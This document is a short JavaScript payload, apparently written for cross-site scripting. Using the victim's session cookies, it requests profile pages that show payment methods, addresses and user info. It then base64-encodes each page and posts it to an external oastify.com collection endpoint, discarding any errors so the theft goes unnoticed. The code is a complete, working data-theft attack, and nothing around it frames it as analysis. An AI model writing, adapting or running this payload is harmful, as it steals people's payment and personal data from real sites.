(async () => {
  const exfilEndpoint = "http://sc8x6e61qbs6lify3ui82ammjdp4dv7jw.oastify.com/";
  const targets = [
    "/Pages/Subscriptions/ProfileManagement.aspx?view=PaymentMethods",
    "/Pages/Subscriptions/ProfileManagement.aspx?view=Address",
    "/user/userinfo/"
  ];

  for (const path of targets) {
    try {
      const res = await fetch(path, { credentials: "include" });
      const html = await res.text();

      const imgData = `data:text/html;base64,${btoa(html)}`;

      await fetch(exfilEndpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          url: location.origin + path,
          image: imgData
        })
      });
    } catch (err) {
      // Fail silently
    }
  }
})();
